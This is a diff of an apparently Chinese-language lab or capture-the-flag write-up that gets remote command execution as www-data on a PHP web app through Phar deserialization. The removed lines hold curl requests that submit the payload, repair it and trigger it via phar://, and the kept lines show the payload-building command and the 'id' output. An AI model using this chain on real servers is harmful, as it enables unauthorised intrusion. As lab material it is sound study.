@@ -394,41 +394,17 @@ php -d phar.readonly=0 make_phar_payload.php system id poc.bin
 ![](file-20260606123033226.png)
 生成出来的 `poc.bin.txt` 是 URL 编码后的 Phar 二进制，拿它去提交。
 
-# 直接 getshell（www-data RCE）
+# getshell
 
-这里直接把 POP 链最终调用点换成 `system`。真正执行的是：
-
-```php
-($key)($this->arg);
-```
-
-只要 `$key` 是合法函数名，就可以变成 `system($arg)`。所以 payload 参数直接是：
-
-```text
-level = system
-arg   = id
-```
-然后提交 payload：
-
-```bash
-curl -c cookie.txt -b cookie.txt \
-  --data-urlencode 'blob@poc.bin.txt' \
-  'http://192.168.56.109/?c=Task&m=submit'
-```
-
+直接提交刚刚的`poc.bin.txt`内容，是一串URL编码字符串
+![](file-20260606125643309.png)
 返回类似：
 
 ```html
 saved: <code>06964165cfa2553046f76ee731d289c9</code>
 ```
 
-再 repair：
-
-```bash
-curl -c cookie.txt -b cookie.txt -X POST \
-  -d 'id=06964165cfa2553046f76ee731d289c9' \
-  'http://192.168.56.109/?c=Task&m=repair'
-```
+再 repair：`06964165cfa2553046f76ee731d289c9`
 
 这一步会生成：
 
@@ -436,21 +412,14 @@ curl -c cookie.txt -b cookie.txt -X POST \
 /var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin
 ```
 
-最后通过 `Files::read()` 触发 `phar://`，这里只把它当作 Phar metadata 触发器：
-
-```bash
-curl -c cookie.txt -b cookie.txt -X POST \
-  --data-urlencode 'file=phar:///var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin/x.txt' \
-  'http://192.168.56.109/?c=Files&m=read'
-```
-
+最后通过查看文件：
+`phar:///var/labdata/archive/06964165cfa2553046f76ee731d289c9.bin/x.tx`
 触发后回显：
 
 ```text
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-not reasonable
+uid=33(www-data) gid=33(www-data) groups=33(www-data) not reasonable
 ```
-
+![](file-20260606125536651.png)
 说明已经拿到 `www-data` 的命令执行。`not reasonable` 是后置过滤器的输出，不影响前面的命令结果。
 
 为了后面枚举方便，可以写一个简单的 RCE 调用器，自动完成：登录、提交 payload、repair、phar 触发。
